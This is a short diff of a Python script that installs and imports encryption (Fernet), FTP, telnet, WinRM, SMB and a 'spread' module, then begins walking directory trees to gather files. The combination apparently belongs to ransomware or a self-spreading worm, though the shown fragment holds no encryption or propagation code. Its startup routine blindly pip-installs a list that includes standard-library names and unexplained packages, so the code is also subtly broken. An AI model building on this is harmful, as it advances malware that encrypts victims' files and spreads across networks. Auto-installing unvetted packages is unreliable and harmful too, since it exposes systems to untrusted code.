@@ -1,5 +1,13 @@
 # Author: SergioZ3R0
 #region Imports
+imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
+#Install necessary modules
+def install(package): # Install the required package
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+for module in imports:
+    install(module)
+#Import necessary modules
 import subprocess
 import sys
 import os
@@ -8,19 +16,14 @@ import socket
 from datetime import datetime, timedelta
 import time
 import window
-
-#Install cryptography module
-def install(package): # Install the required package
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-install('cryptography') # Install the cryptography package
 from cryptography.fernet import Fernet
 from ftplib import FTP
 import telnetlib
 import winrm
 from smb.SMBConnection import SMBConnection
+import spread
 #endregion
-files = [] # List to store the files in the current directory.
+files = [] # List to store the files in the current directory
 def recorrer_arbol_directorios(directory):
     global files
     try:
